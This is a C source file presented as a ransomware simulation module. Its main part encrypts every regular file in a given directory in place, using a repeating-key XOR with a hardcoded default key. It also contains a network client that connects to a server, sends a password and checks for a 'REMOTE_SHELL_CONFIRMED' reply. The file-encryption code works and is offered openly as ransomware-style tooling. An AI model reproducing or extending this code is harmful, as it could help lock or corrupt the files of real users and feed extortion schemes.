#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <errno.h>
#include <getopt.h> 

// experimental ransomware simulation module. Currently local encryption only. Moved its capabilities into crypto.c and its header file as a modular thing.

#define DEFAULT_SERVER_PORT "27015"
#define DEFAULT_SERVER_IP "127.0.0.1"
#define BUFFER_SIZE 1024
#define XOR_KEY "mysecretpass1" // Default encryption/decryption key

void error_exit(const char *message) {
    perror(message);
    exit(EXIT_FAILURE);
}

void print_usage(const char *prog_name) {
    fprintf(stderr, "Usage: %s [-i <ip/domain>] [-p <port>] [-w <password>] [-e <directory>] [-d <directory>] [-k <xor_key>]\n", prog_name);
}

// XOR encryption/decryption
void xor_encrypt(const char *key, unsigned char *data, size_t data_len) {
    size_t key_len = strlen(key);
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

// Encrypt/Decrypt a single file
void process_file(const char *file_path, const char *key) {
    FILE *file = fopen(file_path, "rb+");
    if (!file) {
        perror("Error opening file");
        return;
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    rewind(file);

    if (file_size <= 0) {
        fclose(file);
        return;
    }

    unsigned char *buffer = (unsigned char *)malloc(file_size);
    if (!buffer) {
        perror("Memory allocation failed");
        fclose(file);
        return;
    }

    fread(buffer, 1, file_size, file);
    xor_encrypt(key, buffer, file_size);
    rewind(file);
    fwrite(buffer, 1, file_size, file);

    free(buffer);
    fclose(file);
    printf("Processed file: %s\n", file_path);
}

// Encrypt/Decrypt all files in a directory
void process_directory(const char *directory_path, const char *key) {
    DIR *dir = opendir(directory_path);
    if (!dir) {
        perror("Failed to open directory");
        return;
    }

    struct dirent *entry;
    char full_path[BUFFER_SIZE];

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) { // Process regular files only
            snprintf(full_path, BUFFER_SIZE, "%s/%s", directory_path, entry->d_name);
            process_file(full_path, key);
        }
    }

    closedir(dir);
}

int authenticate(int sockfd, const char *password) {
    char recv_buffer[BUFFER_SIZE];
    ssize_t received;

    // Send password to server
    if (send(sockfd, password, strlen(password), 0) < 0) {
        perror("Failed to send password");
        return 0;
    }

    // Wait for authentication response
    received = recv(sockfd, recv_buffer, BUFFER_SIZE - 1, 0);
    if (received < 0) {
        perror("Failed to receive authentication response");
        return 0;
    }

    recv_buffer[received] = '\0';
    if (strcmp(recv_buffer, "REMOTE_SHELL_CONFIRMED\n") == 0) {
        printf("Authentication successful.\n");
        return 1;
    } else {
        printf("Authentication failed: %s\n", recv_buffer);
        return 0;
    }
}

int main(int argc, char *argv[]) {
    int opt;
    char server_ip[BUFFER_SIZE] = DEFAULT_SERVER_IP;
    char server_port[BUFFER_SIZE] = DEFAULT_SERVER_PORT;
    char password[BUFFER_SIZE] = "";
    char xor_key[BUFFER_SIZE] = XOR_KEY; // Default XOR key
    char *encrypt_dir = NULL;
    char *decrypt_dir = NULL;

    // Parse command-line arguments
    while ((opt = getopt(argc, argv, "i:p:w:e:d:k:")) != -1) {
        switch (opt) {
            case 'i':
                strncpy(server_ip, optarg, BUFFER_SIZE);
                break;
            case 'p':
                strncpy(server_port, optarg, BUFFER_SIZE);
                break;
            case 'w':
                strncpy(password, optarg, BUFFER_SIZE);
                break;
            case 'e':
                encrypt_dir = optarg;
                break;
            case 'd':
                decrypt_dir = optarg;
                break;
            case 'k':
                strncpy(xor_key, optarg, BUFFER_SIZE);
                break;
            default:
                print_usage(argv[0]);
                exit(EXIT_FAILURE);
        }
    }

    if (encrypt_dir && decrypt_dir) {
        fprintf(stderr, "Error: Cannot specify both -e (encrypt) and -d (decrypt) simultaneously.\n");
        print_usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    if (encrypt_dir) {
        printf("Encrypting files in directory: %s\n", encrypt_dir);
        process_directory(encrypt_dir, xor_key);
        return 0;
    }

    if (decrypt_dir) {
        printf("Decrypting files in directory: %s\n", decrypt_dir);
        process_directory(decrypt_dir, xor_key);
        return 0;
    }

    // Proceed with server connection and authentication
    int sockfd;
    struct addrinfo hints, *res, *p;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC; // Support both IPv4 and IPv6
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(server_ip, server_port, &hints, &res) != 0) {
        perror("Error resolving server address");
        exit(EXIT_FAILURE);
    }

    for (p = res; p != NULL; p = p->ai_next) {
        sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (sockfd < 0) continue;

        if (connect(sockfd, p->ai_addr, p->ai_addrlen) == 0) break;

        close(sockfd);
    }

    if (!p) {
        fprintf(stderr, "Error: Unable to connect to server at %s:%s\n", server_ip, server_port);
        freeaddrinfo(res);
        exit(EXIT_FAILURE);
    }

    freeaddrinfo(res);
    printf("Connected to server at %s:%s\n", server_ip, server_port);

    if (!authenticate(sockfd, password)) {
        close(sockfd);
        return 1;
    }

    close(sockfd);
    printf("Client operation completed.\n");
    return 0;
}